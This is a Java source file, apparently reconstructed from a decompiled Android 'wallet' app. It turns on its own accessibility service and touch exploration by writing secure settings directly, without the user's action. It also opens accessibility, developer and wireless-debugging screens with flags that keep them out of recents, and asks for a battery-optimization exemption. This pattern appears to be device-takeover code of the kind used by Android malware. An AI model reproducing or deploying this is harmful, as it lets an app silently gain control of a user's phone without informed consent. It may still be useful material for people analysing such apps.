package com.guard.wallet.utils;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Arrays;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.LinkedList;

/**
 * 辅助功能服务管理 — 原 g.java 中无障碍服务相关方法。
 */
public final class AccessibilityUtils {
    private static final String TAG = "ApplicationUtil";
    private static final String SERVICE_CLASS = "com.guard.wallet.service.MyAccessibilityService";

    private AccessibilityUtils() {}

    private static Context ctx() { return AppManagerUtils.getContext(); }

    /** g.F0(int) — 执行全局无障碍动作（Home/Back/Recent 等） */
    public static boolean performGlobalAction(int action) {
        MyAccessibilityService svc = MyAccessibilityService.P();
        return svc != null && svc.performGlobalAction(action);
    }

    /** g.f0() — 获取本 App 的无障碍服务标识列表 */
    public static LinkedList<String> getServiceIdentifiers() {
        LinkedList<String> list = new LinkedList<>();
        Context context = ctx();
        if (context != null) {
            String pkg = context.getPackageName();
            if (SERVICE_CLASS.contains(pkg)) {
                list.add(pkg + "/.service.MyAccessibilityService");
            }
            list.add(pkg + "/" + SERVICE_CLASS);
        }
        return list;
    }

    /** g.q0() — 获取系统中所有已启用的无障碍服务集合 */
    public static LinkedHashSet<String> getEnabledServices() {
        LinkedHashSet<String> set = new LinkedHashSet<>();
        Context context = ctx();
        if (context != null) {
            String raw = Settings.Secure.getString(context.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (raw != null && !raw.isEmpty()) {
                String[] parts = TextUtils.split(raw, ":");
                if (parts != null && parts.length > 0) {
                    set.addAll(Arrays.asList(parts));
                }
            }
        }
        return set;
    }

    /** g.x() — 检查本 App 无障碍服务是否已启用 */
    public static boolean isAccessibilityServiceEnabled() {
        LinkedList<String> ours = getServiceIdentifiers();
        LinkedHashSet<String> enabled = getEnabledServices();
        if (ours.isEmpty() || enabled.isEmpty()) return false;
        for (String id : ours) {
            if (enabled.contains(id)) return true;
        }
        return false;
    }

    /** g.C() — 通过 WRITE_SECURE_SETTINGS 禁用本 App 无障碍服务 */
    public static boolean disableAccessibilityService() {
        Context context = ctx();
        if (context == null || !PermissionUtils.hasWriteSecureSettings()) return false;
        try {
            LinkedList<String> ours = getServiceIdentifiers();
            LinkedHashSet<String> enabled = getEnabledServices();
            if (!ours.isEmpty() && !enabled.isEmpty()) {
                for (String id : ours) {
                    enabled.remove(id);
                }
            }
            String joined = enabled.isEmpty() ? "" : TextUtils.join(":", enabled);
            return Settings.Secure.putString(context.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, joined);
        } catch (Exception e) {
            Log.e(TAG, "disableAccessibility error", e);
            return false;
        }
    }

    /** g.L() — 通过 WRITE_SECURE_SETTINGS 启用本 App 无障碍服务 */
    public static boolean enableAccessibilityService() {
        Context context = ctx();
        if (context == null || !PermissionUtils.hasWriteSecureSettings()) return false;
        try {
            // 如果已启用，先禁用再重新启用
            if (isAccessibilityServiceEnabled()) {
                disableAccessibilityService();
                DeviceInfoUtils.sleepInIntervals(10); // 等待 2 秒
            }
            if (isAccessibilityServiceEnabled()) return false;

            LinkedList<String> ours = getServiceIdentifiers();
            LinkedHashSet<String> enabled = getEnabledServices();
            if (ours.isEmpty()) return false;

            enabled.add(ours.get(0));
            String joined = TextUtils.join(":", enabled);

            boolean success = Settings.Secure.putString(context.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, joined)
                    && Settings.Secure.putInt(context.getContentResolver(),
                    "accessibility_enabled", 1)
                    && Settings.Secure.putInt(context.getContentResolver(),
                    "touch_exploration_enabled", 1)
                    && Settings.Secure.putString(context.getContentResolver(),
                    "touch_exploration_granted_accessibility_services", joined);

            if (success) {
                Log.d(TAG, "本地启动无障碍服务成功");
            }
            return success;
        } catch (Exception e) {
            Log.e(TAG, "enableAccessibility error", e);
            return false;
        }
    }

    /** g.X0() — 打开系统设置主页 */
    /** vendor g.V0() — 直接打开无障碍设置并定位到本服务 */
    public static boolean openSettings() {
        try {
            Context context = ctx();
            if (context == null) return false;
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);        // 268435456
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);       // 67108864
            intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);      // 8388608
            intent.addFlags(0x20000000);                           // FLAG_ACTIVITY_NO_USER_ACTION
            intent.addFlags(0x00800000);                           // FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
            // 直接定位到本应用的无障碍服务
            android.content.ComponentName comp = new android.content.ComponentName(
                    context, com.guard.wallet.service.MyAccessibilityService.class);
            intent.putExtra(":settings:fragment_args_key", comp.flattenToString());
            android.os.Bundle args = new android.os.Bundle();
            args.putString(":settings:fragment_args_key", comp.flattenToString());
            intent.putExtra(":settings:show_fragment_args", args);
            context.startActivity(intent);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "openSettings error", e);
            return false;
        }
    }

    /** g.Z0(String) — 打开应用详情设置页 */
    public static boolean openAppDetailSettings(String packageName) {
        try {
            Context context = ctx();
            if (context == null) return false;
            String pkg = (packageName == null || packageName.isEmpty()) ? context.getPackageName() : packageName;
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.fromParts("package", pkg, null));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            context.startActivity(intent);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "openAppDetail error", e);
            return false;
        }
    }

    /** g.f1() — 打开开发者选项设置页 */
    public static boolean openDeveloperSettings() {
        Context context = ctx();
        if (context == null) return false;
        try {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP
                    | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION
                    | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            context.startActivity(intent);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "openDeveloperSettings error", e);
            return false;
        }
    }

    /** g.g1() — 打开无线调试设置页 */
    public static boolean openWirelessDebugSettings() {
        Context context = ctx();
        if (context == null) return false;
        try {
            Intent intent = new Intent("com.android.settings.WIRELESS_DEBUGGING_SETTINGS");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP
                    | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION
                    | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            context.startActivity(intent);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "openWirelessDebugSettings error", e);
            return false;
        }
    }

    /** g.j0() — 请求忽略电池优化 */
    public static boolean requestIgnoreBatteryOptimization() {
        if (PermissionUtils.isIgnoringBatteryOptimizations()) return false;
        Context context = ctx();
        if (context == null) return false;
        try {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + context.getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            context.startActivity(intent);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "requestIgnoreBattery error", e);
            return false;
        }
    }
}
